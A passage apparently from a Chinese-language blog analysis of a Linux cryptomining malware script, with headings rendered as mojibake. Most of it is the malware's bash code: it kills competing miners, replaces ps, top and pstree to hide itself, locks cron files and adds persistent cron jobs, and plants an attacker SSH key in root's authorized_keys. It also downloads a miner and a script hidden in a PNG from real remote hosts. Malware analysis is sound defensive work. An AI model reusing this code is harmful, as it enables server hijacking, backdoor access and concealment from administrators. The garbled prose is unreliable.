class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6666 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6665 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6667 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :7777 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :8444 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3347 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:3333&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:5555&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kworker -c\&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;log_&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;systemten&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;netns&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;voltuned&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;darwin&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/dl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ddg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/pprt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ppol&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/65ccE*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/jmx*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/2Ne80*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;IOFoqIgyC0zmf2UR&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;45.76.122.92&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.38.191.178&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.15.56.161&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;86s.jpg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aGTSGJJp&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;nMrfmnRa&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;PuNY5tm2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;I0r8Jyyt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AgdgACUD&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;uiZvwxG8&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;hahwNEdB&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;BtwXn5qH&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3XEzey2T&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;t2tKrCSZ&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;svc&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;HD7fcBgg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;zXcDajSs&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3lmigMo&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AkMK4A2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AJ2AkKe&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ€æ‰é™¤äº†zzhä¹‹å¤–çš„å ç”¨è¶…è¿‡cpuè¶…40%çš„è¿›ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">kill_sus_proc</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    ps axf -o <span class="string">&quot;pid&quot;</span>|<span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            ls -l /proc/<span class="variable">$procid</span>/exe | grep /tmp</span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 1 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">                    <span class="keyword">then</span></span><br><span class="line">                            <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">                    <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    ps axf -o <span class="string">&quot;pid %cpu&quot;</span> | awk <span class="string">&#x27;&#123;if($2&gt;=40.0) print $1&#125;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰ä¸‹è½½å‡½æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">downloads</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/usr/bin/curl&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span> </span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$1</span>,<span class="variable">$2</span></span><br><span class="line">        http_code=`curl -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/cd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        http_code=`cd1 -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wget&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wget --timeout=50 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    wget --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -eq 0 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-chattr.html">chattrå‘½ä»¤ç®€ä»‹</a></p><p>ä½¿ç”¨chattrå®šä¹‰ä¸Šé”è§£é”å‡½æ•°</p><p>-R +iaé€’å½’ä¸Šé”</p><p>-R -iaé€’å½’è§£é”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">unlock_cron</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R -ia /var/spool/cron</span><br><span class="line">    chattr -ia /etc/crontab</span><br><span class="line">    chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R -ia /etc/cron.d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">lock_cron</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R +ia /var/spool/cron</span><br><span class="line">    chattr +ia /etc/crontab</span><br><span class="line">    chattr -R +ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R +ia /etc/cron.d</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­$rtdiræ˜¯å¦å­˜åœ¨ï¼Œåœ¨ä¸Šé¢å®šä¹‰è¿‡ï¼š</p><p>rtdir=â€/etc/zzhsâ€</p><p>å­˜åœ¨å°±è¿›è¡Œï¼Œæ›´æ”¹äº†pså’Œtopå‘½ä»¤ï¼Œä½¿ç”¨grep -vå‘½ä»¤è¿‡æ»¤zzh,pnscan</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg:echo <span class="string">&quot;asasasas&quot;</span> | grep -v <span class="string">&quot;b&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;$rtdir&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">        echo <span class="string">&quot;i am root&quot;</span></span><br><span class="line">        mkdir -p /root/.ssh</span><br><span class="line">        echo <span class="string">&quot;goto 1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>zzhs</span><br><span class="line">        chattr -ia /etc/zzh*</span><br><span class="line">        chattr -ia /etc/newinit.sh*</span><br><span class="line">        chattr -ia /root/.ssh/authorized_keys*</span><br><span class="line">        chattr -R -ia /root/.ssh</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">        echo <span class="string">&quot;/bin/ps changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/ps /bin/ps.original </span><br><span class="line">        echo <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>ps</span><br><span class="line">        echo <span class="string">&quot;ps.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>ps</span><br><span class="line">        chmod +x /bin/ps</span><br><span class="line">    touch -d <span class="number">20160825</span> /bin/ps</span><br><span class="line">        echo <span class="string">&quot;/bin/ps changing&quot;</span></span><br><span class="line">    fi</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/top.original&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">        echo <span class="string">&quot;/bin/top changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/top /bin/top.original </span><br><span class="line">        echo <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>top</span><br><span class="line">        echo <span class="string">&quot;top.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>top</span><br><span class="line">        chmod +x /bin/top</span><br><span class="line">    touch -d <span class="number">20160825</span> /bin/top</span><br><span class="line">        echo <span class="string">&quot;/bin/top changing&quot;</span></span><br><span class="line">    fi</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/pstree.original&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">        echo <span class="string">&quot;/bin/pstree changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/pstree /bin/pstree.original </span><br><span class="line">        echo <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>pstree</span><br><span class="line">        echo <span class="string">&quot;pstree.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>pstree</span><br><span class="line">        chmod +x /bin/pstree</span><br><span class="line">    touch -d <span class="number">20160825</span> /bin/pstree</span><br><span class="line">        echo <span class="string">&quot;/bin/pstree changing&quot;</span></span><br><span class="line">    fi</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/chattr&quot;</span> ]</span><br><span class="line">  then</span><br><span class="line">    chattrsize=<span class="string">`ls -l /bin/chattr | awk &#x27;&#123; print $5 &#125;&#x27;`</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;$chattrsize&quot;</span> -lt <span class="string">&quot;$chattr_size&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">      yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      echo <span class="string">&quot;no need install chattr&quot;</span></span><br><span class="line">    fi</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br></pre></td></tr></table></figure><p>å…ˆè§£é”ï¼Œè®¾ç½®æŒ–çŸ¿ç¨‹åºä»»åŠ¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unlock_cron</span><br><span class="line">                  rm -f $&#123;crondir&#125;</span><br><span class="line">                  rm -f /etc/cron.d/zzh</span><br><span class="line">                  rm -f /etc/crontab</span><br><span class="line">echo <span class="string">&quot;*/30 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; $&#123;crondir&#125;</span><br><span class="line">echo <span class="string">&quot;*/40 * * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>cron.d/zzh</span><br><span class="line">echo <span class="string">&quot;0 1 * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>crontab</span><br><span class="line">                  echo crontab created</span><br><span class="line">lock_cron</span><br></pre></td></tr></table></figure><p>è®¾ç½®å…å¯†ç™»å½•ï¼Œå¾€authorized_keysé‡Œé¢å†™å…¬é’¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">700</span> /root/.ssh/</span><br><span class="line">echo &gt;&gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line">chmod <span class="number">600</span> /root/.ssh/authorized_keys</span><br><span class="line">echo <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver&quot;</span> &gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line">cd1 http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line">wget -q -O- http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line">cd1 http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line">wget -q -O- http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">file=<span class="string">&quot;/etc/zzh&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ¤æ–­zzhå­˜ä¸å­˜åœ¨ï¼Œå¼€å§‹downloadæŒ–çŸ¿ç¨‹åº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;/etc/zzh&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">        filesize1=<span class="string">`ls -l /etc/zzh | awk &#x27;&#123; print $5 &#125;&#x27;`</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;$filesize1&quot;</span> -ne <span class="string">&quot;$miner_size&quot;</span> ] </span><br><span class="line">        then</span><br><span class="line">            pkill -f zzh</span><br><span class="line">            rm /etc/zzh</span><br><span class="line">            downloads $miner_url /etc/zzh $miner_url_backup</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            echo <span class="string">&quot;not need download&quot;</span></span><br><span class="line">        fi</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        downloads $miner_url /etc/zzh $miner_url_backup</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">downloads $sh_url /etc/indexni.png $sh_url_backup</span><br><span class="line">cd /etc/;dd <span class="keyword">if</span>=indexni.png <span class="keyword">of</span>=newinit.sh skip=<span class="number">17704</span> bs=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯åŠ¨è„šæœ¬æ—¶å‚æ•°ä¸ä¸º1å°±ä¸å¯åŠ¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 